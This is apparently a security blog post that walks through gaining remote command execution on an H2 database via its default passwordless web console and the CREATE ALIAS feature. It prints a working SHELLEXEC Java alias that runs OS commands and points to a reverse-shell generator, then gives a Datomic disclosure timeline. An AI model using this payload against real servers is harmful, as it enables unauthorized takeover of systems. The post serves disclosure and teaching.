---
layout: post
title: Abusing H2 Database ALIAS 
description: How to get a shell on a H2 Database, using ALIAS feature.
keywords: rce,abusing,shell,database 
disqus: true
tags: [RCE]
categories: RCE 
---
#### How to get a shell on a H2 Database, using ALIAS feature.
Today I was introduced to [H2 Database](http://www.h2database.com), a in-memory and pure Java Database, because it's a in-memory database, the developers use it most to learning, unit tests and poc's, but you can learn more about it on H2 [site](2018-03-14-abusing-h2-database-alias.markdown).

The H2 provides a web console, where you can manage your database, and here the things starts to be more interesting, by default it does not have an password set, so you can just log in, but what can we do inside it? The first thing I tried was the same trick that everyone knows on MySQL.

```
SELECT 'SOME CONTENT' INTO OUTFILE '/tmp/saida.txt'
```

And of course it didn't work, so I decided to be more smart and google it, trying to discover if anybody already find some RCE on it, and the maximum I found was a report made by the H2 Group on [SecurityFocus]('https://www.securityfocus.com/bid/58536'), but there wasn't an available exploit or any technical detail.

So after it I did the most obvious thing, open the H2 site, go to the documentation, and tried to find any interesting function, the first thing I found was the [FILE_READ](http://www.h2database.com/html/functions.html?highlight=FILE_READ&search=FILE_#file_read) function, where I can read files from filesystem, Ok, cool, it's a nice thing to do, but it's not a shell, so digging on SQL commands section, I found the [CREATE ALIAS](http://www.h2database.com/html/grammar.html#create_alias), basically, you can create an function on H2 that calls a java code, as the example

```
CREATE ALIAS GET_SYSTEM_PROPERTY FOR "java.lang.System.getProperty";
CALL GET_SYSTEM_PROPERTY('java.class.path');
```
or a more complex alias,
```
CREATE ALIAS REVERSE AS $$ String reverse(String s) { return new StringBuilder(s).reverse().toString(); } $$;
CALL REVERSE('Test');
```

Now it's game over, if I can execute Java code, I can get a shell, as I'm not a Java expert, I searchon Google a easy way to execute system commands with java, found a link on [stackoverflow](https://stackoverflow.com/a/20624914), I just adapted it inside the ALIAS, and now there's a function that execute arbitrary code,
```
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;
CALL SHELLEXEC('id')
```

After that just find if the server have any tool to do a [reverse shell](https://github.com/mthbernardes/rsg), and you'll gain a interactive shell.

![h2-console-rce](/assets/images/h2-console-rce.gif)

#### Attack Scenario
One scenario is a distributed database called Datomic. The free version of Datomic uses an embedded H2 storage, and older versions of Datomic enabled the H2 console with the default blank H2 password. The free version is often used locally by developers for quick prototyping, thus unauthenticated local attackers can easily compromise their machines. The issue was disclosed to the Datomic team and was quickly [fixed](http://blog.datomic.com/2018/03/important-security-update.html).

#### Datomic Timeline
2018-03-14 - Initial Vulnerability discovery

2018-03-20 - First contact with Datomic team

2018-03-29 - Fix released

2018-04-05 - Blog published.
